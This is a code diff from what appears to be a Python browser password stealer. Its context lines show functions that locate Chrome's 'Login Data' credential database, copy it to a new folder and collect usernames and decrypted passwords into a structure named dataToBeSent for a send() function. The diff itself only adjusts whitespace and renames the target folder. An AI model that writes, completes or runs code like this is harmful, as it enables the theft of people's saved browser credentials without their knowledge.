@@ -33,6 +33,7 @@ def getpasswords():
                     'username': username,
                     'password': str(password)[2:-1]
                 })
+
 	
 		
 
@@ -52,7 +53,7 @@ def getpasswords():
     return dataToBeSent
 
 def send():
-    
+
     jsonData = getpasswords()
     print(jsonData)
     
@@ -61,7 +62,7 @@ def getpath():
 
 	source = os.getenv('localappdata') + \
                    '\\Google\\Chrome\\User Data\\Default\\Login Data'
-	target = "C:\lmao";
+	target = "C:\prog";
 	try: 
 		os.mkdir(target)
 	except:
